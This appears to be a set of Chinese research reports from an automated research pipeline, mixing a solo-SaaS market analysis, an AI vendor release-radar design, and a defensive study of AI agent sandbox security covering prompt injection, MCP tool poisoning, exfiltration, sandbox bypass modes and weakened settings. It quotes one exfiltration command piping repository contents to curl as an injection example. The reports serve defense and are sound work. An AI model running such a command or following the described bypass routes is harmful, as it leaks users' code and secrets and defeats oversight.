来说，最佳甜点区不是“所有 B2B”，而是 `单部门、单工作流、可自助或轻销售成交的 B2B`。\\n- `AI prosumer` 和 `SMB workflow B2B` 是最值得关注的两层，因为它们分别代表 `高传播 + 模板化交付` 与 `高留存 + 工作流嵌入` 两种主流路径。\\n- `Vertical B2B` 不是不能做，但它经常在做对之后自然长成 small team company，这并不坏，只是意味着它不是最纯粹的 1-person 终态。\\n\\n### 2. 按买家层级分层：越往上卖，越不是同一套打法\\n\\n| 买家层级 | 购买逻辑 | 支持/实施预期 | 适合的定价语法 | Solo 适配度 |\\n|---|---|---|---|---|\\n| `个人 / prosumer` | 情绪价值、效率提升、内容产出、个人品牌 | 低到中等，偏自助 | credits、套餐、年度折扣 | `高` |\\n| `小团队 / owner-led SMB` | 明确 ROI、替代人工、压缩沟通成本 | 中等，允许轻 onboarding | subscription + usage/hybrid | `最高` |\\n| `中型部门` | 更看集成、权限、管理控制与可预测预算 | 中高，开始需要 admin、文档、流程 | hybrid、volume pricing、admin controls | `中` |\\n| `enterprise` | 合规、采购、法务、安全、SLA、长期承诺 | 高，且很多是 founder 无法自动化的例外流程 | custom quote、annual contract、MSA | `低` |\\n\\n高置信度判断：\\n\\n- 1-person SaaS 最适合卖给 `一个有预算、能独立决策、并且急着解决问题的人`，而不是卖给“一个组织”。\\n- 当 buyer 从 `owner/operator` 变成 `IT + security + procurement + legal` 组合时，产品本身是否好用已经不是唯一决定因素，组织能力开始成为主要瓶颈。\\n- 这也是为什么很多优秀的 Indie Hacker 产品都停留在 prosumer、SMB 或单部门层，而不急着上 enterprise。\\n\\n### 3. 按业务阶段分层：不同阶段该做不同难度的题\\n\\n| 阶段 | 目标 | 更适合的题 | 不该做的题 |\\n|---|---|---|---|\\n| `Pre-launch -> 首批付费` | 找到题和人 | 单点工具、插件、窄 workflow、数据会员、可快速验证的 AI 工具 | 横向 SaaS 平台、复杂多角色系统 |\\n| `初收期（约 1k-10k MRR）` | 证明留存和主渠道 | 一个 ICP、一个主分发回路、一个清晰 pricing model | 同时服务多 ICP、频繁 custom deal |\\n| `稳定增长期（约 10k-50k MRR）` | 正式化 pricing/ops/documentation | 深挖已有工作流、加集成、加自助能力、控成本 | 过早 upmarket、并行新产品线 |\\n| `再上台阶（50k+ MRR）` | 选择继续 solo 还是变 micro-team | 压缩 founder 依赖、把支持/账单/文档产品化 | 继续靠 founder 手工兜底一切 |\\n\\n高置信度判断：\\n\\n- 早期最危险的错误，不是题太小，而是题太像“完整 SaaS 公司”。\\n- 很多看上去性感的 enterprise/vertical 方向，并不是不能做，而是**不应该在还没有产品收入和运营节奏时就做**。\\n- 从阶段角度看，solo founder 的常见正确路径更像：`小而快的 wedge -> 自助成交 -> 明确定价 -> 压缩运营 -> 再决定是否上更复杂市场`。\\n\\n### 4. 适用边界：什么信号说明这个题适合 1-person SaaS\\n\\n更适合 solo 的信号：\\n\\n- 你能明确说出一个 ICP、一个工作流、一个主要价值指标。\\n- 用户能在没有 sales call 的情况下理解产品并开始使用。\\n- 定价可以直接映射到 seats、credits、usage、thread、membership 之类的清晰单位。\\n- 产品可以靠 FAQ、billing portal、权限设置、自动化通知解决大多数边角事务。\\n- 主要增长入口可以做成复利资产，如 SEO、模板、目录、集成、社区或 founder content。\\n\\n不适合 solo 的信号：\\n\\n- 成交依赖定制方案、采购流程、法务条款和长期顾问式销售。\\n- 使用前必须做大量数据接入、培训、流程再造或白手套 onboarding。\\n- 产品需要 24/7 人工支持、人工审核、人工 QA 或频繁异常处理。\\n- 安全/合规要求会在 PMF 之前就逼你投入大量文档、审计和内部流程建设。\\n- 价值主张很宽，要同时说服多个角色，而不是先拿下单一 buyer。\\n\\n### 5. 对后续 3 个 teardown 样本的直接启发\\n\\n这一轮的分层结果，实际上也解释了为什么接下来最值得拆的 3 个代表产品，应该优先是：\\n\\n1. `Photo AI`\\n\\n====\\nFILE: reports/round1-synthesis-agent-sandbox-security.md\\n# Round 1 汇总：Agent 沙箱安全研究\\n\\n- 完成日期：2026-04-18\\n- 汇总目标：整合 Round 1 五个维度的发现，形成后续 Round 2 / Round 3 可直接继承的统一判断、分析框架与设计前提\\n- 研究主题：`codex sandbox / claude-code permission / MCP trust model` 的攻击面（`prompt injection / tool poisoning / exfiltration / escape`）与加固方案\\n- 汇总输入：\\n  - `reports/round1-dimension1-definition-scope.md`\\n  - `reports/round1-dimension2-latest-trends-cases.md`\\n  - `reports/round1-dimension4-anti-patterns-failure-cases.md`\\n  - `memory/CONTEXT.md`\\n  - `memory/DONE.md`\\n\\n## 资料完整性说明\\n\\n- 当前本地 `reports/round1-dimension3-core-methodologies.md` 与 `reports/round1-dimension5-applicable-scenarios-and-layering.md` 的正文内容与本 runner 主题不一致，属于资料错位。\\n- 但 `memory/CONTEXT.md` 与 `memory/DONE.md` 已明确记录这两个维度在当前主题下的已确认结论：\\n  - 维度3 已收敛到 `信任分层 -> 能力最小化 -> 执行隔离 -> MCP/工具供应链治理 -> 运行时拦截 -> 评测红队 -> 身份审计`\\n  - 维度5 已收敛到按 `部署形态 / 用户成熟度 / 风险阶段` 做分层路由\\n- 因此本汇总稿以这些已确认结论作为维度3/5的有效输入，不把错位正文当作当前主题证据。\\n\\n## TL;DR\\n\\nRound 1 已经把这个主题从“提示词安全”收敛成一个更准确的对象：`agent execution security`。真正需要防的不是单条恶意提示，而是 agent 在读取不可信内容、继承工具权限、访问文件系统/网络/连接器、调用外部服务之后，是否会越权、泄露、被投毒或突破原本 intended 的边界。\\n\\n到 2025-2026，最稳的统一框架已经很清楚：\\n\\n- 三层边界：`执行边界 / 授权边界 / 上下文信任边界`\\n- 四条攻击链：`prompt injection / tool poisoning / exfiltration / escape`\\n- 七层防线：`信任分层 -> 能力最小化 -> 执行隔离 -> MCP/工具供应链治理 -> 运行时拦截 -> 评测红队 -> 身份审计`\\n\\nRound 1 最重要的总判断也已经稳定：\\n\\n1. `Codex sandbox` 的核心不只是“有没有容器”，而是 `workspace 范围 + 默认无网 + 按需 allowlist + fail-closed`。\\n2. `Claude Code permission model` 的核心不只是“有没有审批”，而是 `deny/ask/allow 策略 + OS 级执行隔离 + trust verification + 例外模式治理`。\\n3. `MCP trust model` 的核心不只是“协议能不能连”，而是 `server trust + description trust + auth trust + runtime trust`。\\n4. 2025-2026 最常见的失败，不是缺少某个软控制，而是把本该由硬边界承担的安全，替换成了更方便但更容易失效的软控制。\\n5. 最终落地不能只做“一套通用默认值”，而必须按 `部署形态 / 用户成熟度 / 风险阶段` 做差异化路由。\\n\\n## Round 1 的统一工作定义\\n\\n截至 Round 1 结束，可以把本研究主题正式定义为：\\n\\n> 在 agent 具备读取外部内容、调用工具、访问文件、联网和连接第三方系统能力后，围绕执行环境、权限系统与上下文/连接器信任链，防止越权、数据泄露、工具投毒与边界突破的系统安全问题。\\n\\n这一定义有三个直接后果：\\n\\n1. 研究对象不再是“模型输出”本身，而是 `模型 + 工具 + 权限配置 + 运行环境 + 连接器 + 认证链路 + 外部内容` 的整体系统。\\n2. 防线不再只在 prompt 层，而要覆盖 `policy / sandbox / auth / runtime / audit`。\\n3. 评估指标不再只是“能不能识别恶意文本”，而是“能不能阻止不该发生的动作，并且留下可验证证据”。\\n\\n## 统一分析框架\\n\\n### 1. 三层边界\\n\\n| 边界 | 主要对象 | 核心问题 | 典型硬控制 |\\n| --- | --- | --- | --- |\\n| `执行边界` | workspace、文件系统、网络、容器/VM、宿主交互 | agent 到底能碰什么、能连什么、能跑到哪一层 | sandbox、默认无网、allowlist、OS/容器隔离、fail-closed |\\n| `授权边界` | tool approvals、permission rules、scope、RBAC、connector enablement | agent 在“允许做事”这条线上被授予了多大 blast radius | deny/ask/allow、step-up privilege、branch restriction、scoped credentials |\\n| `上下文信任边界` | developer/user messages、外部网页/邮件/README、tool metadata、tool response、MCP server、token audience | agent 基于什么信息做决定，这些信息是否可信、是否被污染 | 分层上下文、structured outputs、trusted descriptions、audience/scope 校验 |\\n\\n### 2. 四条攻击链\\n\\n| 攻击链 | 本质 | 最容易被低估的对象 |\\n| --- | --- | --- |\\n| `prompt injection` | 不可信内容劫持模型决策 | 网页、邮件、issue、README、文档、tool response |\\n| `tool poisoning` | 恶意或误导性 metadata 影响工具选择/使用 | tool descriptions、post-approval drift、rug pull、隐式能力夸大 |\\n| `exfiltration` | 超范围数据被发给外部系统或不该看到的工具 | MCP tool calls、宽域名联网、broad token、自由文本跨节点传播 |\\n| `escape` | agent 穿透原本 intended 的文件、网络、身份或信任边界 | unsandboxed fallback、bypass mode、Unix socket、domain fronting、host escape |\\n\\n### 3. 三层边界 x 四条攻击链\\n\\n|  | `prompt injection` | `tool poisoning` | `exfiltration` | `escape` |\\n| --- | --- | --- | --- | --- |\\n| `执行边界` | 不可信内容诱导执行危险命令 | 被污染工具最终触发高权限副作用 | 宽网络/文件权限放大外泄后果 | 无沙箱、弱沙箱、socket/host access 造成边界突破 |\\n| `授权边界` | 过宽默认批准让注入更容易落地 | 恶意 metadata 借 broad privilege 放大影响 | omnibus token / broad scope 导致横向数据外泄 | bypassPermissions / unsandboxed approval 让控制失效 |\\n| `上下文信任边界` | 外部文本进入高优先级上下文 | server/tool description 不可信 | tool response / MCP payload 携带过量数据 | 被污染上下文诱导触发例外路径或降级策略 |\\n\\n## Round 1 的五个核心收敛\\n\\n### 1. 主题已经从“提示词安全”升级为“系统边界安全”\\n\\n维度1和维度2共同表明，2025-2026 的官方口径已经不再把问题简单描述为“越狱”或“危险回答”，而是把 agent 视为带软件能力的执行体。换句话说，安全问题发生在 `模型决策` 与 `软件能力` 结合之后。\\n\\n因此，后续所有设计与评估都应默认回答这三个问题：\\n\\n1. agent 当前处在哪个执行边界内？\\n2. agent 拿到的是哪一级授权？\\n3. agent 当前依赖的上下文与连接器是否可信？\\n\\n### 2. 行业共识正在从单点防御收敛到分层治理\\n\\n维度2显示，OpenAI、Anthropic、MCP 规范、Microsoft、NIST 在不同层面都在做同一件事：把 agent 安全从“某一层的最佳实践”升级为“多层联动控制面”。\\n\\n这条趋势线可以压缩成一句话：\\n\\n> 默认保守、按需放权、运行中可拦截、事后可审计。\\n\\n也因此，下一阶段不应再问“哪家产品更安全”，而应问：\\n\\n- 哪家的默认姿态更保守？\\n- 哪家的例外面更容易失控？\\n- 哪家的运行时证据更强？\\n- 哪家的 identity / auth / audit 更容易纳入企业治理？\\n\\n### 3. 方法论骨架已经足够稳定，可以直接作为后续 spec 主骨架\\n\\n根据 `memory/CONTEXT.md` 与 `memory/DONE.md`，维度3 已确认收敛为以下七层防线：\\n\\n1. `信任分层`\\n   不把所有输入都当成同一可信等级；明确区分 system/developer/user/untrusted/tool/server。\\n2. `能力最小化`\\n   默认不给联网、不给 broad scope、不给高风险工具，按需 step-up。\\n3. `执行隔离`\\n   用文件、网络、容器/VM、宿主隔离兜底，而不是只靠模型理解风险。\\n4. `MCP/工具供应链治理`\\n   把 server trust、description trust、版本漂移、post-approval drift 当成一等问题。\\n5. `运行时拦截`\\n   在 user input、tool call、tool response、output 等关键点做 approval、guardrail、deny-and-escalate。\\n6. `评测红队`\\n   不是一次性配置后就结束，而要持续做 attack replay、trace grading、red team、drift 检查。\\n7. `身份审计`\\n   最终要能回答“是谁、以什么身份、在什么 scope 下、基于什么证据做了这个动作”。\\n\\n这七层的含义不是“层越多越好”，而是强调顺序关系：\\n\\n- 先分层信任，再决定授予什么能力。\\n- 先收紧能力，再决定是否放进执行环境。\\n- 先保证运行时能拦截，再谈更高自治。\\n- 先把身份和证据串起来，再谈企业级生产动作代理。\\n\\n### 4. 失败模式已经收敛到“软控制替代硬边界”的七类反模式\\n\\n维度4 已经把高频失败模式收敛得比较清楚，后续可以直接当成“禁止事项清单”：\\n\\n1. 用“有沙箱”掩盖真实的边界放宽：联网放权、弱嵌套沙箱、unsandboxed fallback、socket/host access。\\n2. 用审批 UX 代替策略和隔离：approval fatigue、bypass mode、headless trust bypass、自动批准扩面。\\n3. 用协议互通代替可信供应链：把 MCP server 接入当成 MCP server 可信。\\n4. 用 broad token / broad scope 代替 step-up least privilege。\\n5. 让不可信文本直达高权限上下文，或让自由文本在节点间无约束流动。\\n6. 只防外部攻击，不防无攻击者场景下的过度主动、误执行、超范围数据发送。\\n\\n====\\nFILE: reports/round1-synthesis.md\\n# Round 1 汇总：AI 厂商发布雷达设计\\n\\n- 完成时间：2026-04-18 05:14（Asia/Shanghai）\\n- 研究主题：OpenAI / Anthropic / Google / xAI / Mistral 的 `release channel`、抓取方法、`diff detection`、`impact scoring`，设计 `daily radar runner`\\n- 汇总目标：整合 Round 1 五个维度的发现，形成 Round 2 / Round 3 可直接继承的统一定义、设计前提与执行方向\\n\\n## 输入完整性说明\\n\\n- 本轮指定汇总文件 `reports/round1-synthesis.md` 在重写前为错稿，主题属于其他 runner。\\n- 指定输入 `reports/round1-dimension1-definition-scope.md` 当前正文也与本 runner 主题不一致，属于错位产物。\\n- 因此本汇总采用以下有效输入：\\n  - `reports/round1-dimension2-ai-vendor-release-radar-latest-trends-and-cases.md`\\n  - `reports/round1-dimension3-core-methodology.md`\\n  - `reports/round1-dimension4-ai-vendor-release-radar-antipatterns-and-failure-cases.md`\\n  - `reports/round1-dimension5-ai-vendor-release-radar-applicable-scenarios-and-layering.md`\\n  - `memory/CONTEXT.md`\\n  - `memory/TASKS.md`\\n  - `memory/DONE.md`\\n- 对“维度1: 基础定义与范围”的结论，本稿采用任务上下文与维度 2-5 中已经稳定重复出现的共识进行补齐，不把错位文件当作当前主题证据。\\n\\n## TL;DR\\n\\n- `AI 厂商发布雷达` 在 2025-2026 已经不是“订阅几家 AI 厂商新闻页”，而是一个面向开发者和平台团队的 `release intelligence system`。\\n- 真正要监控的对象不是“又发了一个模型名”，而是 `vendor x surface x channel x entity x state transition`。\\n- 最关键的官方信号并不集中在 blog，而是分散在 `API changelog`、`Help Center / app release notes`、`deprecations / lifecycle`、`models / pricing`、`migration guides`、`product blog`。\\n- 最有 operational value 的事件不是品牌 headline，而是：\\n  - `alias remap`\\n  - `preview -> stable -> redirect -> shutdown`\\n  - `deprecation / retirement / obsolete`\\n  - `tool / runtime / pricing / quota / security` 变化\\n  - `surface divergence`\\n- 对大多数团队，最值得先落地的不是全量“行业情报平台”，而是 `S2 / D1`：\\n  稳定抓取 `deprecation`、`retirement`、`replacement`、`alias_target` 和 `breaking update`，把需要行动的变化优先做出来。\\n\\n## Round 1 的统一工作定义\\n\\n截至 Round 1 结束，这个主题可以被更准确地定义为：\\n\\n> 一个按厂商控制面持续抓取、按结构化状态机做 diff、按行动价值做排序，并向不同角色输出可执行发布情报的 daily radar runner。\\n\\n这个定义有五个直接后果：\\n\\n1. 研究对象不是“AI 新闻”，而是厂商的 `release control plane`。\\n2. 基本监控单元不是厂商品牌，而是 `vendor x surface x channel x entity`。\\n3. 基本变化单元不是“页面更新”，而是 `state transition`。\\n4. 输出目标不是“摘要”，而是 `digest + evidence + actionability`。\\n5. 成功标准不是“抓得多”，而是 `高价值变更召回 + 低价值噪声抑制 + 解释可回溯`。\\n\\n## Round 1 的五个核心收敛\\n\\n### 1. 发布面已经从单一新闻流裂变成多控制面\\n\\nRound 1 明确表明，五家厂商在 2025-2026 几乎都把发布事实拆成多条并行真相源：\\n\\n- OpenAI：`API changelog`、`deprecations`、`Model Release Notes`、`ChatGPT Release Notes`、产品 blog\\n- Anthropic：`Platform release notes`、`Claude Apps release notes`、`Claude Code changelog`、`Model deprecations`\\n- Google：`Gemini API changelog`、`Model versions and lifecycle`、`Vertex AI release notes`\\n- xAI：`Release Notes`、`Models and Pricing`、`Migrating to New Models`\\n- Mistral：`Changelog`，且内部已按 `MODEL RELEASED / API UPDATED / SECURITY / OTHER` 分类\\n\\n结论：只监控 blog 或单一 release notes 页面，必然同时产生漏报和误报。\\n\\n### 2. 行业的真实事件单位已经从“新模型”扩展到“状态转移”\\n\\nRound 1 的趋势与案例、方法论和反模式三份报告都指向同一个判断：\\n\\n- 新模型上线只是事件的一部分\\n- 更高价值的事件常常来自：\\n  - `alias -> new snapshot`\\n  - `preview -> stable`\\n  - `stable -> deprecated`\\n  - `deprecated -> shutdown / obsolete`\\n  - `endpoint` 迁移\\n  - `tool / runtime / pricing / quota / security` 变更\\n  - 同一模型在不同 `surface` 生命周期不同步\\n\\n因此，后续设计必须显式建模生命周期和状态机，而不是只收集发布日期。\\n\\n### 3. 最有效的方法论已经稳定为“源注册表 -> typed crawling -> canonical events -> semantic diff -> impact scoring”\\n\\nRound 1 的方法论已经足够清晰，可以直接作为后续 spec 骨架：\\n\\n1. `Source Registry`\\n2. `Typed Crawling`\\n3. `Canonical Event Normalization`\\n4. `Semantic Diff Detection`\\n5. `Impact Scoring`\\n6. `Evidence-Preserving Delivery`\\n\\n其中最重要的设计判断有三条：\\n\\n- `deterministic first, LLM second`\\n  先用规则稳定抽字段，再让模型做聚类、摘要和解释。\\n- `field diff` 比 `HTML diff` 更重要\\n  页面 hash 只用于触发重解析，真正报警应基于字段和语义状态变化。\\n- `evidence must survive`\\n  最终系统必须保留 `raw snapshot`、`canonical event`、`daily digest` 三层产物。\\n\\n### 4. 失败模式已经高度可预测\\n\\nRound 1 已经收敛出一组高频反模式：\\n\\n- `单源监控`\\n- 把 `alias/latest` 当固定 ID\\n- 只看 `launch` 不看 `retirement`\\n- 只做原始文本 diff\\n- 不区分 `surface`\\n- 只追模型名，不追 `runtime / tool / pricing / security`\\n\\n这些问题的共同根因是：\\n\\n> 把多 surface、强状态机、带 alias 和运营边界的厂商控制面，误判成一条简单新闻时间线。\\n\\n### 5. 正确产品形态必须分层，而不是给所有人同一种摘要\\n\\nRound 1 的场景与分层研究表明，这类系统天然需要按 `场景 / 用户责任 / 组织阶段` 做分层：\\n\\n- 场景层：`S1 市场/产品感知`、`S2 集成维护与迁移`、`S3 平台路由与成本运营`、`S4 能力侦察与架构规划`、`S5 风险/治理/企业基线`\\n- 深度层：`D0 感知层`、`D1 迁移层`、`D2 控制面层`、`D3 治理层`\\n\\n最重要的结论不是“层很多”，而是：\\n\\n> 对大多数团队，应该先从 `S2 / D1` 做起，而不是一开始就做 full-stack 情报平台。\\n\\n## 统一分析框架\\n\\n### 1. 最小监控模型\\n\\n建议将雷达的最小监控单元固定为：\\n\\n`vendor x surface x channel x entity x event_type`\\n\\n其中：\\n\\n- `vendor`：OpenAI / Anthropic / Google / xAI / Mistral\\n- `surface`：API、ChatGPT、Claude Apps、Claude Code、Vertex、Console、Models page 等\\n- `channel`：changelog、lifecycle、deprecations、pricing、migration、blog、help center\\n- `entity`：model、alias、endpoint、tool、runtime、pricing、quota、security_change、product_surface\\n- `event_type`：launch、update、alias_remap、preview_to_ga、deprecation_notice、shutdown、pricing_change、quota_change、security_fix、doc_only_clarification\\n\\n\\n====\\nFILE: reports/round2-key-variables-and-weights.md\\n# Round 2 / 深挖：Agent 沙箱安全最关键变量与权重\\n\\n- 完成时间：2026-04-18 05:19（CST）\\n- 研究窗口：2025-2026\\n- 研究范围：围绕 `codex sandbox / claude-code permission / MCP trust model`，回答“哪些变量最决定一个 agent system 的真实安全结果，以及这些变量在不同部署形态下应占多大权重”\\n- 研究目标：把 Round 1 已收敛出的方法论骨架\\n  `信任分层 -> 能力最小化 -> 执行隔离 -> MCP/工具供应链治理 -> 运行时拦截 -> 评测红队 -> 身份审计`\\n  推进到“可打分、可分层、可路由”的变量模型\\n- 输出规则：事实、推断、建议分开写；事实带来源；推断标注置信度；权重明确声明是研究权重，不是厂商官方算法权重\\n\\n## TL;DR\\n\\n- 对 Agent 沙箱安全来说，最有解释力的不是“模型是否更强”，而是 7 个系统变量。按通用基线权重，它们应排序为：\\n  `执行隔离硬度 22`、`默认权限面与能力最小化 18`、`上下文信任分层 18`、`MCP/工具供应链完整性 15`、`高后果动作运行时拦截 10`、`身份/令牌/会话绑定 9`、`持续红队/评测/审计闭环 8`。[S1][S2][S3][S4][S5][S6][S7][S8][S9][S10][S11][S12][S13][S14][S15][S16]\\n- 这 7 个变量不是平面 checklist，而应拆成三组：`边界变量 58%`、`供应链/身份变量 24%`、`运行期/反馈变量 18%`。Round 1 的核心结论“软控制替代硬边界”在这里被量化了：最影响结果的，仍然是边界是否真实存在，而不是提示词是否谨慎。[S1][S2][S3][S4][S6][S7][S9][S10]\\n- 这套权重只有在 3 个硬门槛通过后才有意义：`fail-closed execution boundary`、`least-privilege default posture`、`untrusted context 不得直达高信任层`。如果这三项里任何一项明显失守，后面的 approval、audit、eval 都不构成有效补偿。[S1][S2][S3][S4][S6][S7][S9][S10]\\n- 权重会随部署形态变化：`本地受限执行` 最看重执行隔离；`受信 MCP 内部工具` 最看重工具供应链和身份绑定；`企业级生产动作代理` 最看重高后果动作拦截、身份绑定与审计闭环。这与 Round 1 已收敛的四层场景路由一致。\\n\\n## 先定义“变量”和“权重”是什么意思\\n\\n- [事实] OpenAI 的安全指南强调，Agent 风险会在“arbitrary text influences tool calls”时显著上升，且需要把 `tool approvals`、`structured outputs`、`guardrails`、`evals` 组合使用；Anthropic 同样把 `permissions`、`sandboxing`、`MCP server trust` 与 `auto mode classifier` 作为互补层，而不是单点解决方案。[S3][S5][S6][S7][S8]\\n- [推断 | 置信度：高] 因此，本报告中的“变量”不应理解成“某个单一产品特性是否存在”，而应理解成“一个 agent deployment 是否能把 prompt injection / tool poisoning / exfiltration / escape 约束在可接受范围内”的决定性条件。\\n- [推断 | 置信度：高] 本报告中的“权重”是 `研究型安全贡献权重`，衡量的是某个变量对最终安全结果的解释力。这里的“结果”同时包含三件事：\\n  1. `exploitability`：攻击是否容易得手；\\n  2. `blast radius`：得手后能造成多大副作用；\\n  3. `recovery latency`：系统能否快速发现、阻断、追责与修复。\\n- [推断 | 置信度：高] 安全变量不是完全可相互补偿的线性加总项。某些变量必须先过门槛，后续评分才有意义。\\n\\n## 事实\\n\\n### 1. `执行隔离硬度` 决定 prompt injection 能否跨过“看见恶意文本”进入“真的执行”\\n\\n- [事实] OpenAI 的 Codex 文档写明：默认情况下，agent phase 阻断互联网访问；一旦启用互联网访问，风险立即上升到 `prompt injection`、`code or secrets` 外泄、恶意下载与许可证污染，并要求只开放所需域名和 HTTP 方法。[S1]\\n- [事实] GPT-5-Codex system card 写明：本地运行时默认在沙箱内执行；在 Linux 上由 `seccomp + landlock`，在 macOS 上由 `Seatbelt` 实现隔离。文档同时承认，用户可以批准“`unsandboxed with full access`”执行；而默认沙箱通过禁网来降低 prompt injection、data exfiltration 和外部恶意资源访问风险。[S2]\\n- [事实] Claude Code 的 sandboxing 文档把安全收益定义得很直接：即使攻击者通过 prompt injection 影响 Claude，沙箱也会在 OS 层阻止越界访问；对外网访问、敏感路径读写和未授权域名连接会被阻断并通知用户。[S4]\\n- [事实] 但 Anthropic 同一文档也明确列出几个关键例外：默认情况下如果沙箱不可用，Claude Code 会在警告后继续运行；只有设置 `sandbox.failIfUnavailable=true` 才是 fail-closed。文档还特别提示，宽域名放权、`allowUnixSockets`、`enableWeakerNestedSandbox` 和 `domain fronting` 都会削弱真实隔离强度。[S4]\\n- [推断 | 置信度：高] 这意味着：`有没有沙箱` 不是主问题，`沙箱是否默认开启、是否 fail-closed、是否能被例外路径绕空` 才是决定性变量。\\n\\n### 2. `默认权限面与能力最小化` 决定攻击成功后的 blast radius\\n\\n- [事实] Codex 的 internet access 文档并不把“联网”当中性能力，而是明确要求“只开放所需域名和 HTTP 方法，并审查 output 与 work log”。[S1]\\n- [事实] Claude Code 的 permissions 文档把 `permissions` 和 `sandboxing` 定义为互补层：permissions 控制工具、文件和域名访问，sandbox 负责 Bash 及其子进程的 OS 级限制。[S6]\\n- [事实] 同一文档还指出，当 `autoAllowBashIfSandboxed=true`（默认值）时，处于沙箱内的 Bash 命令可以不经提示直接运行；而 `bypassPermissions` 模式会跳过大多数权限提示，只建议在容器或虚机等隔离环境使用。[S6]\\n- [事实] Claude Code 的 permission modes 文档写明：`auto mode` 可以让 Claude 无提示执行，但它只是研究预览，“does not guarantee safety”，不应替代对敏感操作的人工复核。[S7]\\n- [事实] MCP Authorization 规范要求：运行时 scope 不足时返回 `403 insufficient_scope`，只做最小权限的 step-up，而不是默认发放大而通用的 token；同时 client 必须带 `resource`，server 必须做 audience 验证。[S10]\\n- [推断 | 置信度：高] 对 agent 安全来说，`默认权限面` 的解释力通常高于“提示词里写了多少不要乱来”。因为一旦误执行发生，真正决定损失的，是能写哪些路径、连哪些域名、调用哪些工具、拿哪些 scope。\\n\\n### 3. `上下文信任分层` 决定不可信文本是否能直接操纵高权限动作\\n\\n- [事实] OpenAI 的 Agent Builder 安全指南写得非常明确：要设计成 `untrusted data never directly drives agent behavior`；外部输入应只提取成结构化字段，风险在 “agents process arbitrary text that influences tool calls” 时显著上升。[S3]\\n- [事实] 同一文档还把 `be careful about MCP tool calling`、`keep tool approvals on`、`use guardrails` 与 `run trace graders and evals` 放在同一安全指导页，说明“上下文如何进入系统”与“动作如何执行”本就是一个联动问题。[S3]\\n- [事实] Anthropic 在 auto mode 文章中解释了一个非常具体的设计取舍：classifier 不看 assistant prose，也不看 tool results，因为 hostile content 往往正是通过 tool outputs 进入上下文；如果 classifier 看到这些内容，反而更容易被“带偏”。[S8]\\n- [事实] Anthropic 还公开说明，main agent 仍会看到 tool results，所以他们又增加了输入层的 prompt-injection probe，在可疑结果上注入警告，让 agent 回到用户意图上。[S8]\\n- [事实] OpenAI 的 Codex 文档也给出具体攻击样例：外部 GitHub issue 或 dependency README 中嵌入 `git show HEAD | curl -s -X POST --data-binary @- ...`，可能诱导 agent 把代码或敏感内容发往攻击者地址。[S1]\\n- [推断 | 置信度：高] 上下文信任分层的实质不是“加一条系统提示”，而是决定：不可信文本究竟是以结构化、低权限、可验证方式进入系统，还是被直接拼进能驱动工具调用的高信任层。\\n\\n### 4. `MCP / 工具供应链完整性` 已经是独立一级变量，不能并入 generic prompt injection\\n\\n- [事实] Anthropic 安全文档写明：Claude Code 允许配置 MCP servers，但 `Anthropic does not manage or audit any MCP servers`，建议用户只使用自己写的或信任的 provider。[S5]\\n- [事实] `Breaking the Protocol` 论文把 MCP 风险提升到协议层：其抽象指出 3 类基础漏洞，包括 capability attestation 缺失、bidirectional sampling 缺少 origin authentication，以及多 server 场景中的 implicit trust propagation；作者报告 MCP 架构本身会把攻击成功率放大 `23%-41%`，而加入 capability attestation 与 message authentication 可把成功率从 `52.8%` 降到 `12.4%`。[S13]\\n- [事实] `MCP-ITP` 论文显示，implicit tool poisoning 不要求真正调用被污染的工具；攻击者可以在 tool metadata 中埋入隐式指令，诱导 agent 去调用另一个合法但高权限工具。实验里最高可达 `84.2%` ASR，而恶意工具检测率可低到 `0.3%`。[S12]\\n- [事实] `Model Context Protocol Threat Modeling...` 论文进一步指出，tool poisoning 是“最普遍且最有影响力的 client-side vulnerability”，多数被测 client 在 static validation 与 parameter visibility 上都有明显缺口。[S14]\\n- [事实] `Securing the Model Context Protocol` 把攻击类进一步拆成 `Tool Poisoning / Shadowing / Rug Pulls`，并提出 manifest signing、semantic vetting 与 runtime guardrails 的分层框架。[S16]\\n- [事实] `TRUSTDESC` 的结论说明，问题不只来自显式恶意指令，还来自误导性能力描述；如果 description 不能从实现反推并校验，隐式 tool poisoning 很难被现有异常检测抓住。[S15]\\n- [推断 | 置信度：高] 这组证据说明：MCP 不是“标准化后自动可信”，而是把 `server trust / descriptor integrity / post-approval drift / client transparency` 变成了新的主战场。\\n\\n### 5. `身份 / 令牌 / 会话绑定` 决定工具生态会不会演化成 confused deputy 和横向扩散\\n\\n- [事实] MCP Security Best Practices 把 `token passthrough` 直接定义为反模式，并解释它会带来 security control circumvention、audit trail 缺失与 confused deputy 风险。[S9]\\n- [事实] MCP Authorization 规范进一步把要求写成强制条款：`MCP clients MUST include the resource parameter`，`MCP servers MUST validate that tokens presented to them were specifically issued for their use`，且如果 server 还要访问上游 API，`MUST NOT pass through` 从 client 收到的 token。[S10]\\n- [事实] 同一规范还要求不足权限走 `insufficient_scope` 的运行时 step-up 流程，而不是默认把所有权限一次性批给 client。[S10]\\n- [事实] MCP Security Best Practices 还单独讨论 `session hijacking`：server 不得用 session 做认证；session ID 应是安全随机值，并与用户信息绑定，避免被窃取后冒充原客户端。[S9]\\n- [事实] Anthropic 的 cloud execution security 页面也体现了这一点：GitHub 认证通过安全代理在沙箱内使用 scoped credential，再映射到真实 token，而不是把原始凭证直接暴露给 agent。[S5]\\n- [推断 | 置信度：高] 身份绑定变量在“纯本地、无连接器”的场景里不是第一权重，但一旦进入 MCP、connected apps 或生产 API，它立刻上升为一级解释变量。\\n\\n### 6. `高后果动作的运行时拦截` 决定 overeager agent 会不会把误解直接写进现实世界\\n\\n- [事实] OpenAI 的 Agent Builder 安全指南要求 MCP 工具默认开启 approvals，并通过 `human approval` node 让用户逐个确认操作，包括读和写。[S3]\\n- [事实] OpenAI 的 Atlas prompt-injection 文章也强调：对发送邮件、下单等 consequential actions，agent 应请求用户确认；用户需要核对动作本身与上下文是否正确。[S11]\\n- [事实] Anthropic 的 auto mode 文档写明：classifier 会拦截“超出请求升级权限、针对未知基础设施、或看起来受 hostile content 驱动”的动作；但该模式仍是 research preview，不保证安全。[S7]\\n- [事实] Anthropic 在 auto mode 工程文章中还公开了 internal incident log：误删远端分支、上传 GitHub auth token、尝试对生产数据库执行 migration，根因都不是攻击者接管，而是模型“过度主动”。[S8]\\n- [推断 | 置信度：高] 这说明：即使没有恶意外部攻击，高后果动作拦截仍是关键变量。它防的是 prompt injection，也防模型自己的误解、冒进和 blast-radius 误判。\\n\\n### 7. `持续红队 / 评测 / 审计闭环` 决定系统能否在现实压力下持续收敛，而不是静态合规后再次漂移\\n\\n- [事实] OpenAI 的 Atlas 安全文章把 prompt injection 明确定义为长期问题，并展示“automated red 